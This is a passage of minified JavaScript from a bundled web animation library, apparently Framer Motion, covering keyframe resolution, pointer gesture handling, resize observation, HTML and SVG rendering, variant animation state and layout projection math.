r=="string"&&!Ite.has(r)&&fp(r).values.length&&(i=a[n]),n++}if(i&&t)for(const r of e)a[r]=S_(t,i)}class jte extends vS{constructor(e,t,n,i,r){super(e,t,n,i,r,!0)}readKeyframes(){const{unresolvedKeyframes:e,element:t,name:n}=this;if(!t||!t.current)return;super.readKeyframes();for(let f=0;f<e.length;f++){let h=e[f];if(typeof h=="string"&&(h=h.trim(),uS(h))){const E=p_(h,t.current);E!==void 0&&(e[f]=E),f===e.length-1&&(this.finalKeyframe=h)}}if(this.resolveNoneKeyframes(),!f_.has(n)||e.length!==2)return;const[i,r]=e,l=FL(i),u=FL(r),d=RL(i),p=RL(r);if(d!==p&&Vs[n]){this.needsMeasurement=!0;return}if(l!==u)if(kL(l)&&kL(u))for(let f=0;f<e.length;f++){const h=e[f];typeof h=="string"&&(e[f]=parseFloat(h))}else Vs[n]&&(this.needsMeasurement=!0)}resolveNoneKeyframes(){const{unresolvedKeyframes:e,name:t}=this,n=[];for(let i=0;i<e.length;i++)(e[i]===null||Cte(e[i]))&&n.push(i);n.length&&wte(e,n,t)}measureInitialState(){const{element:e,unresolvedKeyframes:t,name:n}=this;if(!e||!e.current)return;n==="height"&&(this.suspendedScrollY=window.pageYOffset),this.measuredOrigin=Vs[n](e.measureViewportBox(),window.getComputedStyle(e.current)),t[0]=this.measuredOrigin;const i=t[t.length-1];i!==void 0&&e.getValue(n,i).jump(i,!1)}measureEndState(){const{element:e,name:t,unresolvedKeyframes:n}=this;if(!e||!e.current)return;const i=e.getValue(t);i&&i.jump(this.measuredOrigin,!1);const r=n.length-1,l=n[r];n[r]=Vs[t](e.measureViewportBox(),window.getComputedStyle(e.current)),l!==null&&this.finalKeyframe===void 0&&(this.finalKeyframe=l),this.removedTransforms?.length&&this.removedTransforms.forEach(([u,d])=>{e.getValue(u).set(d)}),this.resolveNoneKeyframes()}}const Dte=new Set(["opacity","clipPath","filter","transform"]);function C_(a,e,t){if(a==null)return[];if(a instanceof EventTarget)return[a];if(typeof a=="string"){const i=document.querySelectorAll(a);return i?Array.from(i):[]}return Array.from(a).filter(n=>n!=null)}const T_=(a,e)=>e&&typeof a=="number"?e.transform(a):a;function x_(a){return IN(a)&&"offsetHeight"in a}const{schedule:xS}=FN(queueMicrotask,!1),gi={x:!1,y:!1};function A_(){return gi.x||gi.y}function Mte(a){return a==="x"||a==="y"?gi[a]?null:(gi[a]=!0,()=>{gi[a]=!1}):gi.x||gi.y?null:(gi.x=gi.y=!0,()=>{gi.x=gi.y=!1})}function P_(a,e){const t=C_(a),n=new AbortController,i={passive:!0,...e,signal:n.signal};return[t,i,()=>n.abort()]}function Nte(a){return!(a.pointerType==="touch"||A_())}function _te(a,e,t={}){const[n,i,r]=P_(a,t);return n.forEach(l=>{let u=!1,d=!1,p;const f=()=>{l.removeEventListener("pointerleave",A)},h=R=>{p&&(p(R),p=void 0),f()},E=R=>{u=!1,window.removeEventListener("pointerup",E),window.removeEventListener("pointercancel",E),d&&(d=!1,h(R))},C=()=>{u=!0,window.addEventListener("pointerup",E,i),window.addEventListener("pointercancel",E,i)},A=R=>{if(R.pointerType!=="touch"){if(u){d=!0;return}h(R)}},j=R=>{if(!Nte(R))return;d=!1;const I=e(l,R);typeof I=="function"&&(p=I,l.addEventListener("pointerleave",A,i))};l.addEventListener("pointerenter",j,i),l.addEventListener("pointerdown",C,i)}),r}const L_=(a,e)=>e?a===e?!0:L_(a,e.parentElement):!1,AS=a=>a.pointerType==="mouse"?typeof a.button!="number"||a.button<=0:a.isPrimary!==!1,qte=new Set(["BUTTON","INPUT","SELECT","TEXTAREA","A"]);function kte(a){return qte.has(a.tagName)||a.isContentEditable===!0}const Ote=new Set(["INPUT","SELECT","TEXTAREA"]);function Ute(a){return Ote.has(a.tagName)||a.isContentEditable===!0}const Zf=new WeakSet;function HL(a){return e=>{e.key==="Enter"&&a(e)}}function Ry(a,e){a.dispatchEvent(new PointerEvent("pointer"+e,{isPrimary:!0,bubbles:!0}))}const zte=(a,e)=>{const t=a.currentTarget;if(!t)return;const n=HL(()=>{if(Zf.has(t))return;Ry(t,"down");const i=HL(()=>{Ry(t,"up")}),r=()=>Ry(t,"cancel");t.addEventListener("keyup",i,e),t.addEventListener("blur",r,e)});t.addEventListener("keydown",n,e),t.addEventListener("blur",()=>t.removeEventListener("keydown",n),e)};function GL(a){return AS(a)&&!A_()}const QL=new WeakSet;function Bte(a,e,t={}){const[n,i,r]=P_(a,t),l=u=>{const d=u.currentTarget;if(!GL(u)||QL.has(u))return;Zf.add(d),t.stopPropagation&&QL.add(u);const p=e(d,u),f=(C,A)=>{window.removeEventListener("pointerup",h),window.removeEventListener("pointercancel",E),Zf.has(d)&&Zf.delete(d),GL(C)&&typeof p=="function"&&p(C,{success:A})},h=C=>{f(C,d===window||d===document||t.useGlobalTarget||L_(d,C.target))},E=C=>{f(C,!1)};window.addEventListener("pointerup",h,i),window.addEventListener("pointercancel",E,i)};return n.forEach(u=>{(t.useGlobalTarget?window:u).addEventListener("pointerdown",l,i),x_(u)&&(u.addEventListener("focus",p=>zte(p,i)),!kte(u)&&!u.hasAttribute("tabindex")&&(u.tabIndex=0))}),r}function PS(a){return IN(a)&&"ownerSVGElement"in a}const eh=new WeakMap;let ah;const R_=(a,e,t)=>(n,i)=>i&&i[0]?i[0][a+"Size"]:PS(n)&&"getBBox"in n?n.getBBox()[e]:n[t],Fte=R_("inline","width","offsetWidth"),Vte=R_("block","height","offsetHeight");function Hte({target:a,borderBoxSize:e}){eh.get(a)?.forEach(t=>{t(a,{get width(){return Fte(a,e)},get height(){return Vte(a,e)}})})}function Gte(a){a.forEach(Hte)}function Qte(){typeof ResizeObserver>"u"||(ah=new ResizeObserver(Gte))}function Jte(a,e){ah||Qte();const t=C_(a);return t.forEach(n=>{let i=eh.get(n);i||(i=new Set,eh.set(n,i)),i.add(e),ah?.observe(n)}),()=>{t.forEach(n=>{const i=eh.get(n);i?.delete(e),i?.size||ah?.unobserve(n)})}}const th=new Set;let bc;function Wte(){bc=()=>{const a={get width(){return window.innerWidth},get height(){return window.innerHeight}};th.forEach(e=>e(a))},window.addEventListener("resize",bc)}function Kte(a){return th.add(a),bc||Wte(),()=>{th.delete(a),!th.size&&typeof bc=="function"&&(window.removeEventListener("resize",bc),bc=void 0)}}function iE(a,e){return typeof a=="function"?Kte(a):Jte(a,e)}function I_(a,e){let t;const n=()=>{const{currentTime:i}=e,l=(i===null?0:i.value)/100;t!==l&&a(l),t=l};return va.preUpdate(n,!0),()=>ei(n)}function Yte(a){return PS(a)&&a.tagName==="svg"}function $te(...a){const e=!Array.isArray(a[0]),t=e?0:-1,n=a[0+t],i=a[1+t],r=a[2+t],l=a[3+t],u=hS(i,r,l);return e?u(n):u}function Xte(a,e,t={}){const n=a.get();let i=null,r=n,l;const u=typeof n=="string"?n.replace(/[\d.-]/g,""):void 0,d=()=>{i&&(i.stop(),i=null)},p=()=>{d();const f=WL(a.get()),h=WL(r);f!==h&&(i=new Pg({keyframes:[f,h],velocity:a.getVelocity(),type:"spring",restDelta:.001,restSpeed:.01,...t,onUpdate:l}))};if(a.attach((f,h)=>{r=f,l=E=>h(JL(E,u)),va.postRender(()=>{p(),a.events.animationStart?.notify(),i?.then(()=>{a.events.animationComplete?.notify()})})},d),wt(e)){const f=e.on("change",E=>a.set(JL(E,u))),h=a.on("destroy",f);return()=>{f(),h()}}return d}function JL(a,e){return e?a+e:a}function WL(a){return typeof a=="number"?a:parseFloat(a)}const Zte=[...y_,mt,xi],ene=a=>Zte.find(v_(a)),KL=()=>({translate:0,scale:1,origin:0,originPoint:0}),vc=()=>({x:KL(),y:KL()}),YL=()=>({min:0,max:0}),bt=()=>({x:YL(),y:YL()}),ane=new WeakMap;function Lg(a){return a!==null&&typeof a=="object"&&typeof a.start=="function"}function hp(a){return typeof a=="string"||Array.isArray(a)}const LS=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],RS=["initial",...LS];function Rg(a){return Lg(a.animate)||RS.some(e=>hp(a[e]))}function w_(a){return!!(Rg(a)||a.variants)}function tne(a,e,t){for(const n in e){const i=e[n],r=t[n];if(wt(i))a.addValue(n,i);else if(wt(r))a.addValue(n,yi(i,{owner:a}));else if(r!==i)if(a.hasValue(n)){const l=a.getValue(n);l.liveStyle===!0?l.jump(i):l.hasAnimated||l.set(i)}else{const l=a.getStaticValue(n);a.addValue(n,yi(l!==void 0?l:i,{owner:a}))}}for(const n in t)e[n]===void 0&&a.removeValue(n);return e}const oE={current:null},j_={current:!1},nne=typeof window<"u";function ine(){if(j_.current=!0,!!nne)if(window.matchMedia){const a=window.matchMedia("(prefers-reduced-motion)"),e=()=>oE.current=a.matches;a.addEventListener("change",e),e()}else oE.current=!1}const $L=["AnimationStart","AnimationComplete","Update","BeforeLayoutMeasure","LayoutMeasure","LayoutAnimationStart","LayoutAnimationComplete"];let zh={};function D_(a){zh=a}function one(){return zh}class sne{scrapeMotionValuesFromProps(e,t,n){return{}}constructor({parent:e,props:t,presenceContext:n,reducedMotionConfig:i,skipAnimations:r,blockInitialAnimation:l,visualState:u},d={}){this.current=null,this.children=new Set,this.isVariantNode=!1,this.isControllingVariants=!1,this.shouldReduceMotion=null,this.shouldSkipAnimations=!1,this.values=new Map,this.KeyframeResolver=vS,this.features={},this.valueSubscriptions=new Map,this.prevMotionValues={},this.hasBeenMounted=!1,this.events={},this.propEventSubscriptions={},this.notifyUpdate=()=>this.notify("Update",this.latestValues),this.render=()=>{this.current&&(this.triggerBuild(),this.renderInstance(this.current,this.renderState,this.props.style,this.projection))},this.renderScheduledAt=0,this.scheduleRender=()=>{const C=Zt.now();this.renderScheduledAt<C&&(this.renderScheduledAt=C,va.render(this.render,!1,!0))};const{latestValues:p,renderState:f}=u;this.latestValues=p,this.baseTarget={...p},this.initialValues=t.initial?{...p}:{},this.renderState=f,this.parent=e,this.props=t,this.presenceContext=n,this.depth=e?e.depth+1:0,this.reducedMotionConfig=i,this.skipAnimationsConfig=r,this.options=d,this.blockInitialAnimation=!!l,this.isControllingVariants=Rg(t),this.isVariantNode=w_(t),this.isVariantNode&&(this.variantChildren=new Set),this.manuallyAnimateOnMount=!!(e&&e.current);const{willChange:h,...E}=this.scrapeMotionValuesFromProps(t,{},this);for(const C in E){const A=E[C];p[C]!==void 0&&wt(A)&&A.set(p[C])}}mount(e){if(this.hasBeenMounted)for(const t in this.initialValues)this.values.get(t)?.jump(this.initialValues[t]),this.latestValues[t]=this.initialValues[t];this.current=e,ane.set(e,this),this.projection&&!this.projection.instance&&this.projection.mount(e),this.parent&&this.isVariantNode&&!this.isControllingVariants&&(this.removeFromVariantTree=this.parent.addVariantChild(this)),this.values.forEach((t,n)=>this.bindToMotionValue(n,t)),this.reducedMotionConfig==="never"?this.shouldReduceMotion=!1:this.reducedMotionConfig==="always"?this.shouldReduceMotion=!0:(j_.current||ine(),this.shouldReduceMotion=oE.current),this.shouldSkipAnimations=this.skipAnimationsConfig??!1,this.parent?.addChild(this),this.update(this.props,this.presenceContext),this.hasBeenMounted=!0}unmount(){this.projection&&this.projection.unmount(),ei(this.notifyUpdate),ei(this.render),this.valueSubscriptions.forEach(e=>e()),this.valueSubscriptions.clear(),this.removeFromVariantTree&&this.removeFromVariantTree(),this.parent?.removeChild(this);for(const e in this.events)this.events[e].clear();for(const e in this.features){const t=this.features[e];t&&(t.unmount(),t.isMounted=!1)}this.current=null}addChild(e){this.children.add(e),this.enteringChildren??(this.enteringChildren=new Set),this.enteringChildren.add(e)}removeChild(e){this.children.delete(e),this.enteringChildren&&this.enteringChildren.delete(e)}bindToMotionValue(e,t){if(this.valueSubscriptions.has(e)&&this.valueSubscriptions.get(e)(),t.accelerate&&Dte.has(e)&&this.current instanceof HTMLElement){const{factory:l,keyframes:u,times:d,ease:p,duration:f}=t.accelerate,h=new c_({element:this.current,name:e,keyframes:u,times:d,ease:p,duration:Ti(f)}),E=l(h);this.valueSubscriptions.set(e,()=>{E(),h.cancel()});return}const n=iu.has(e);n&&this.onBindTransform&&this.onBindTransform();const i=t.on("change",l=>{this.latestValues[e]=l,this.props.onUpdate&&va.preRender(this.notifyUpdate),n&&this.projection&&(this.projection.isTransformDirty=!0),this.scheduleRender()});let r;typeof window<"u"&&window.MotionCheckAppearSync&&(r=window.MotionCheckAppearSync(this,e,t)),this.valueSubscriptions.set(e,()=>{i(),r&&r(),t.owner&&t.stop()})}sortNodePosition(e){return!this.current||!this.sortInstanceNodePosition||this.type!==e.type?0:this.sortInstanceNodePosition(this.current,e.current)}updateFeatures(){let e="animation";for(e in zh){const t=zh[e];if(!t)continue;const{isEnabled:n,Feature:i}=t;if(!this.features[e]&&i&&n(this.props)&&(this.features[e]=new i(this)),this.features[e]){const r=this.features[e];r.isMounted?r.update():(r.mount(),r.isMounted=!0)}}}triggerBuild(){this.build(this.renderState,this.latestValues,this.props)}measureViewportBox(){return this.current?this.measureInstanceViewportBox(this.current,this.props):bt()}getStaticValue(e){return this.latestValues[e]}setStaticValue(e,t){this.latestValues[e]=t}update(e,t){(e.transformTemplate||this.props.transformTemplate)&&this.scheduleRender(),this.prevProps=this.props,this.props=e,this.prevPresenceContext=this.presenceContext,this.presenceContext=t;for(let n=0;n<$L.length;n++){const i=$L[n];this.propEventSubscriptions[i]&&(this.propEventSubscriptions[i](),delete this.propEventSubscriptions[i]);const r="on"+i,l=e[r];l&&(this.propEventSubscriptions[i]=this.on(i,l))}this.prevMotionValues=tne(this,this.scrapeMotionValuesFromProps(e,this.prevProps||{},this),this.prevMotionValues),this.handleChildMotionValue&&this.handleChildMotionValue()}getProps(){return this.props}getVariant(e){return this.props.variants?this.props.variants[e]:void 0}getDefaultTransition(){return this.props.transition}getTransformPagePoint(){return this.props.transformPagePoint}getClosestVariantNode(){return this.isVariantNode?this:this.parent?this.parent.getClosestVariantNode():void 0}addVariantChild(e){const t=this.getClosestVariantNode();if(t)return t.variantChildren&&t.variantChildren.add(e),()=>t.variantChildren.delete(e)}addValue(e,t){const n=this.values.get(e);t!==n&&(n&&this.removeValue(e),this.bindToMotionValue(e,t),this.values.set(e,t),this.latestValues[e]=t.get())}removeValue(e){this.values.delete(e);const t=this.valueSubscriptions.get(e);t&&(t(),this.valueSubscriptions.delete(e)),delete this.latestValues[e],this.removeValueFromRenderState(e,this.renderState)}hasValue(e){return this.values.has(e)}getValue(e,t){if(this.props.values&&this.props.values[e])return this.props.values[e];let n=this.values.get(e);return n===void 0&&t!==void 0&&(n=yi(t===null?void 0:t,{owner:this}),this.addValue(e,n)),n}readValue(e,t){let n=this.latestValues[e]!==void 0||!this.current?this.latestValues[e]:this.getBaseTargetFromProps(this.props,e)??this.readValueFromInstance(this.current,e,this.options);return n!=null&&(typeof n=="string"&&(RN(n)||wN(n))?n=parseFloat(n):!ene(n)&&xi.test(t)&&(n=S_(e,t)),this.setBaseTarget(e,wt(n)?n.get():n)),wt(n)?n.get():n}setBaseTarget(e,t){this.baseTarget[e]=t}getBaseTarget(e){const{initial:t}=this.props;let n;if(typeof t=="string"||typeof t=="object"){const r=SS(this.props,t,this.presenceContext?.custom);r&&(n=r[e])}if(t&&n!==void 0)return n;const i=this.getBaseTargetFromProps(this.props,e);return i!==void 0&&!wt(i)?i:this.initialValues[e]!==void 0&&n===void 0?void 0:this.baseTarget[e]}on(e,t){return this.events[e]||(this.events[e]=new sS),this.events[e].add(t)}notify(e,...t){this.events[e]&&this.events[e].notify(...t)}scheduleRenderMicrotask(){xS.render(this.render)}}class M_ extends sne{constructor(){super(...arguments),this.KeyframeResolver=jte}sortInstanceNodePosition(e,t){return e.compareDocumentPosition(t)&2?1:-1}getBaseTargetFromProps(e,t){const n=e.style;return n?n[t]:void 0}removeValueFromRenderState(e,{vars:t,style:n}){delete t[e],delete n[e]}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);const{children:e}=this.props;wt(e)&&(this.childSubscription=e.on("change",t=>{this.current&&(this.current.textContent=`${t}`)}))}}class ur{constructor(e){this.isMounted=!1,this.node=e}update(){}}function N_({top:a,left:e,right:t,bottom:n}){return{x:{min:e,max:t},y:{min:a,max:n}}}function rne({x:a,y:e}){return{top:e.min,right:a.max,bottom:e.max,left:a.min}}function lne(a,e){if(!e)return a;const t=e({x:a.left,y:a.top}),n=e({x:a.right,y:a.bottom});return{top:t.y,left:t.x,bottom:n.y,right:n.x}}function Iy(a){return a===void 0||a===1}function sE({scale:a,scaleX:e,scaleY:t}){return!Iy(a)||!Iy(e)||!Iy(t)}function Gr(a){return sE(a)||__(a)||a.z||a.rotate||a.rotateX||a.rotateY||a.skewX||a.skewY}function __(a){return XL(a.x)||XL(a.y)}function XL(a){return a&&a!=="0%"}function Bh(a,e,t){const n=a-t,i=e*n;return t+i}function ZL(a,e,t,n,i){return i!==void 0&&(a=Bh(a,i,n)),Bh(a,t,n)+e}function rE(a,e=0,t=1,n,i){a.min=ZL(a.min,e,t,n,i),a.max=ZL(a.max,e,t,n,i)}function q_(a,{x:e,y:t}){rE(a.x,e.translate,e.scale,e.originPoint),rE(a.y,t.translate,t.scale,t.originPoint)}const eR=.999999999999,aR=1.0000000000001;function cne(a,e,t,n=!1){const i=t.length;if(!i)return;e.x=e.y=1;let r,l;for(let u=0;u<i;u++){r=t[u],l=r.projectionDelta;const{visualElement:d}=r.options;d&&d.props.style&&d.props.style.display==="contents"||(n&&r.options.layoutScroll&&r.scroll&&r!==r.root&&Ec(a,{x:-r.scroll.offset.x,y:-r.scroll.offset.y}),l&&(e.x*=l.x.scale,e.y*=l.y.scale,q_(a,l)),n&&Gr(r.latestValues)&&Ec(a,r.latestValues))}e.x<aR&&e.x>eR&&(e.x=1),e.y<aR&&e.y>eR&&(e.y=1)}function yc(a,e){a.min=a.min+e,a.max=a.max+e}function tR(a,e,t,n,i=.5){const r=Ja(a.min,a.max,i);rE(a,e,t,r,n)}function Ec(a,e){tR(a.x,e.x,e.scaleX,e.scale,e.originX),tR(a.y,e.y,e.scaleY,e.scale,e.originY)}function k_(a,e){return N_(lne(a.getBoundingClientRect(),e))}function une(a,e,t){const n=k_(a,t),{scroll:i}=e;return i&&(yc(n.x,i.offset.x),yc(n.y,i.offset.y)),n}const dne={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},pne=nu.length;function mne(a,e,t){let n="",i=!0;for(let r=0;r<pne;r++){const l=nu[r],u=a[l];if(u===void 0)continue;let d=!0;if(typeof u=="number")d=u===(l.startsWith("scale")?1:0);else{const p=parseFloat(u);d=l.startsWith("scale")?p===1:p===0}if(!d||t){const p=T_(u,TS[l]);if(!d){i=!1;const f=dne[l]||l;n+=`${f}(${p}) `}t&&(e[l]=p)}}return n=n.trim(),t?n=t(e,i?"":n):i&&(n="none"),n}function IS(a,e,t){const{style:n,vars:i,transformOrigin:r}=a;let l=!1,u=!1;for(const d in e){const p=e[d];if(iu.has(d)){l=!0;continue}else if(HN(d)){i[d]=p;continue}else{const f=T_(p,TS[d]);d.startsWith("origin")?(u=!0,r[d]=f):n[d]=f}}if(e.transform||(l||t?n.transform=mne(e,a.transform,t):n.transform&&(n.transform="none")),u){const{originX:d="50%",originY:p="50%",originZ:f=0}=r;n.transformOrigin=`${d} ${p} ${f}`}}function O_(a,{style:e,vars:t},n,i){const r=a.style;let l;for(l in e)r[l]=e[l];i?.applyProjectionStyles(r,n);for(l in t)r.setProperty(l,t[l])}function nR(a,e){return e.max===e.min?0:a/(e.max-e.min)*100}const gd={correct:(a,e)=>{if(!e.target)return a;if(typeof a=="string")if(Ne.test(a))a=parseFloat(a);else return a;const t=nR(a,e.target.x),n=nR(a,e.target.y);return`${t}% ${n}%`}},fne={correct:(a,{treeScale:e,projectionDelta:t})=>{const n=a,i=xi.parse(a);if(i.length>5)return n;const r=xi.createTransformer(a),l=typeof i[0]!="number"?1:0,u=t.x.scale*e.x,d=t.y.scale*e.y;i[0+l]/=u,i[1+l]/=d;const p=Ja(u,d,.5);return typeof i[2+l]=="number"&&(i[2+l]/=p),typeof i[3+l]=="number"&&(i[3+l]/=p),r(i)}},lE={borderRadius:{...gd,applyTo:["borderTopLeftRadius","borderTopRightRadius","borderBottomLeftRadius","borderBottomRightRadius"]},borderTopLeftRadius:gd,borderTopRightRadius:gd,borderBottomLeftRadius:gd,borderBottomRightRadius:gd,boxShadow:fne};function U_(a,{layout:e,layoutId:t}){return iu.has(a)||a.startsWith("origin")||(e||t!==void 0)&&(!!lE[a]||a==="opacity")}function wS(a,e,t){const n=a.style,i=e?.style,r={};if(!n)return r;for(const l in n)(wt(n[l])||i&&wt(i[l])||U_(l,a)||t?.getValue(l)?.liveStyle!==void 0)&&(r[l]=n[l]);return r}function hne(a){return window.getComputedStyle(a)}class gne extends M_{constructor(){super(...arguments),this.type="html",this.renderInstance=O_}readValueFromInstance(e,t){if(iu.has(t))return this.projection?.isProjecting?J0(t):Nae(e,t);{const n=hne(e),i=(HN(t)?n.getPropertyValue(t):n[t])||0;return typeof i=="string"?i.trim():i}}measureInstanceViewportBox(e,{transformPagePoint:t}){return k_(e,t)}build(e,t,n){IS(e,t,n.transformTemplate)}scrapeMotionValuesFromProps(e,t,n){return wS(e,t,n)}}const bne={offset:"stroke-dashoffset",array:"stroke-dasharray"},vne={offset:"strokeDashoffset",array:"strokeDasharray"};function yne(a,e,t=1,n=0,i=!0){a.pathLength=1;const r=i?bne:vne;a[r.offset]=`${-n}`,a[r.array]=`${e} ${t}`}const Ene=["offsetDistance","offsetPath","offsetRotate","offsetAnchor"];function z_(a,{attrX:e,attrY:t,attrScale:n,pathLength:i,pathSpacing:r=1,pathOffset:l=0,...u},d,p,f){if(IS(a,u,p),d){a.style.viewBox&&(a.attrs.viewBox=a.style.viewBox);return}a.attrs=a.style,a.style={};const{attrs:h,style:E}=a;h.transform&&(E.transform=h.transform,delete h.transform),(E.transform||h.transformOrigin)&&(E.transformOrigin=h.transformOrigin??"50% 50%",delete h.transformOrigin),E.transform&&(E.transformBox=f?.transformBox??"fill-box",delete h.transformBox);for(const C of Ene)h[C]!==void 0&&(E[C]=h[C],delete h[C]);e!==void 0&&(h.x=e),t!==void 0&&(h.y=t),n!==void 0&&(h.scale=n),i!==void 0&&yne(h,i,r,l,!1)}const B_=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]),F_=a=>typeof a=="string"&&a.toLowerCase()==="svg";function Sne(a,e,t,n){O_(a,e,void 0,n);for(const i in e.attrs)a.setAttribute(B_.has(i)?i:CS(i),e.attrs[i])}function V_(a,e,t){const n=wS(a,e,t);for(const i in a)if(wt(a[i])||wt(e[i])){const r=nu.indexOf(i)!==-1?"attr"+i.charAt(0).toUpperCase()+i.substring(1):i;n[r]=a[i]}return n}class Cne extends M_{constructor(){super(...arguments),this.type="svg",this.isSVGTag=!1,this.measureInstanceViewportBox=bt}getBaseTargetFromProps(e,t){return e[t]}readValueFromInstance(e,t){if(iu.has(t)){const n=E_(t);return n&&n.default||0}return t=B_.has(t)?t:CS(t),e.getAttribute(t)}scrapeMotionValuesFromProps(e,t,n){return V_(e,t,n)}build(e,t,n){z_(e,t,this.isSVGTag,n.transformTemplate,n.style)}renderInstance(e,t,n,i){Sne(e,t,n,i)}mount(e){this.isSVGTag=F_(e.tagName),super.mount(e)}}const Tne=RS.length;function H_(a){if(!a)return;if(!a.isControllingVariants){const t=a.parent?H_(a.parent)||{}:{};return a.props.initial!==void 0&&(t.initial=a.props.initial),t}const e={};for(let t=0;t<Tne;t++){const n=RS[t],i=a.props[n];(hp(i)||i===!1)&&(e[n]=i)}return e}function G_(a,e){if(!Array.isArray(e))return!1;const t=e.length;if(t!==a.length)return!1;for(let n=0;n<t;n++)if(e[n]!==a[n])return!1;return!0}const xne=[...LS].reverse(),Ane=LS.length;function Pne(a){return e=>Promise.all(e.map(({animation:t,options:n})=>Ete(a,t,n)))}function Lne(a){let e=Pne(a),t=iR(),n=!0;const i=d=>(p,f)=>{const h=Rc(a,f,d==="exit"?a.presenceContext?.custom:void 0);if(h){const{transition:E,transitionEnd:C,...A}=h;p={...p,...A,...C}}return p};function r(d){e=d(a)}function l(d){const{props:p}=a,f=H_(a.parent)||{},h=[],E=new Set;let C={},A=1/0;for(let R=0;R<Ane;R++){const I=xne[R],w=t[I],k=p[I]!==void 0?p[I]:f[I],Y=hp(k),ee=I===d?w.isActive:null;ee===!1&&(A=R);let Q=k===f[I]&&k!==p[I]&&Y;if(Q&&n&&a.manuallyAnimateOnMount&&(Q=!1),w.protectedKeys={...C},!w.isActive&&ee===null||!k&&!w.prevProp||Lg(k)||typeof k=="boolean")continue;if(I==="exit"&&w.isActive&&ee!==!0){w.prevResolvedValues&&(C={...C,...w.prevResolvedValues});continue}const q=Rne(w.prevProp,k);let M=q||I===d&&w.isActive&&!Q&&Y||R>A&&Y,N=!1;const L=Array.isArray(k)?k:[k];let _=L.reduce(i(I),{});ee===!1&&(_={});const{prevResolvedValues:V={}}=w,F={...V,..._},ce=re=>{M=!0,E.has(re)&&(N=!0,E.delete(re)),w.needsAnimating[re]=!0;const Ee=a.getValue(re);Ee&&(Ee.liveStyle=!1)};for(const re in F){const Ee=_[re],je=V[re];if(C.hasOwnProperty(re))continue;let G=!1;Z0(Ee)&&Z0(je)?G=!G_(Ee,je):G=Ee!==je,G?Ee!=null?ce(re):E.add(re):Ee!==void 0&&E.has(re)?ce(re):w.protectedKeys[re]=!0}w.prevProp=k,w.prevResolvedValues=_,w.isActive&&(C={...C,..._}),n&&a.blockInitialAnimation&&(M=!1);const me=Q&&q;M&&(!me||N)&&h.push(...L.map(re=>{const Ee={type:I};if(typeof re=="string"&&n&&!me&&a.manuallyAnimateOnMount&&a.parent){const{parent:je}=a,G=Rc(je,re);if(je.enteringChildren&&G){const{delayChildren:J}=G.transition||{};Ee.delay=d_(je.enteringChildren,a,J)}}return{animation:re,options:Ee}}))}if(E.size){const R={};if(typeof p.initial!="boolean"){const I=Rc(a,Array.isArray(p.initial)?p.initial[0]:p.initial);I&&I.transition&&(R.transition=I.transition)}E.forEach(I=>{const w=a.getBaseTarget(I),k=a.getValue(I);k&&(k.liveStyle=!0),R[I]=w??null}),h.push({animation:R})}let j=!!h.length;return n&&(p.initial===!1||p.initial===p.animate)&&!a.manuallyAnimateOnMount&&(j=!1),n=!1,j?e(h):Promise.resolve()}function u(d,p){if(t[d].isActive===p)return Promise.resolve();a.variantChildren?.forEach(h=>h.animationState?.setActive(d,p)),t[d].isActive=p;const f=l(d);for(const h in t)t[h].protectedKeys={};return f}return{animateChanges:l,setActive:u,setAnimateFunction:r,getState:()=>t,reset:()=>{t=iR()}}}function Rne(a,e){return typeof e=="string"?e!==a:Array.isArray(e)?!G_(e,a):!1}function Vr(a=!1){return{isActive:a,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function iR(){return{animate:Vr(!0),whileInView:Vr(),whileHover:Vr(),whileTap:Vr(),whileDrag:Vr(),whileFocus:Vr(),exit:Vr()}}function oR(a,e){a.min=e.min,a.max=e.max}function hi(a,e){oR(a.x,e.x),oR(a.y,e.y)}function sR(a,e){a.translate=e.translate,a.scale=e.scale,a.originPoint=e.originPoint,a.origin=e.origin}const Q_=1e-4,Ine=1-Q_,wne=1+Q_,J_=.01,jne=0-J_,Dne=0+J_;function en(a){return a.max-a.min}function Mne(a,e,t){return Math.abs(a-e)<=t}function rR(a,e,t,n=.5){a.origin=n,a.originPoint=Ja(e.min,e.max,a.origin),a.scale=en(t)/en(e),a.translate=Ja(t.min,t.max,a.origin)-a.originPoint,(a.scale>=Ine&&a.scale<=wne||isNaN(a.scale))&&(a.scale=1),(a.translate>=jne&&a.translate<=Dne||isNaN(a.translate))&&(a.translate=0)}function Jd(a,e,t,n){rR(a.x,e.x,t.x,n?n.originX:void 0),rR(a.y,e.y,t.y,n?n.originY:void 0)}function lR(a,e,t){a.min=t.min+e.min,a.max=a.min+en(e)}function Nne(a,e,t){lR(a.x,e.x,t.x),lR(a.y,e.y,t.y)}function cR(a,e,t){a.min=e.min-t.min,a.max=a.min+en(e)}function Fh(a,e,t){cR(a.x,e.x,t.x),cR(a.y,e.y,t.y)}function uR(a,e,t,n,i){return a-=e,a=Bh(a,1/t,n),i!==void 0&&(a=Bh(a,1/i,n)),a}function _ne(a,e=0,t=1,n=.5,i,r=a,l=a){if(ro.test(e)&&(e=parseFloat(e),e=Ja(l.min,l.max,e/100)-l.min),typeof e!="number")return;let u=Ja(r.min,r.max,n);a===r&&(u-=e),a.min=uR(a.min,e,t,u,i),a.max=uR(a.max,e,t,u,i)}function dR(a,e,[t,n,i],r,l){_ne(a,e[t],e[n],e[i],e.scale,r,l)}const qne=["x","scaleX","originX"],kne=["y","scaleY","originY"];function pR(a,e,t,n){dR(a.x,e,qne,t?t.x:void 0,n?n.x:void 0),dR(a.y,e,kne,t?t.y:void 0,n?n.y:void 0)}function mR(a){return a.translate===0&&a.scale===1}function W_(a){return mR(a.x)&&mR(a.y)}function fR(a,e){return a.min===e.min&&a.max===e.max}function One(a,e){return fR(a.x,e.x)&&fR(a.y,e.y)}function hR(a,e){return Math.round(a.min)===Math.round(e.min)&&Math.round(a.max)===Math.round(e.max)}function K_(a,e){return hR(a.x,e.x)&&hR(a.y,e.y)}function gR(a){return en(a.x)/en(a.y)}function bR(a,e){return a.translate===e.translate&&a.scale===e.scale&&a.originPoint===e.originPoint}function Zi(a){return[a("x"),a("y")]}function Une(a,e,t){let n="";const 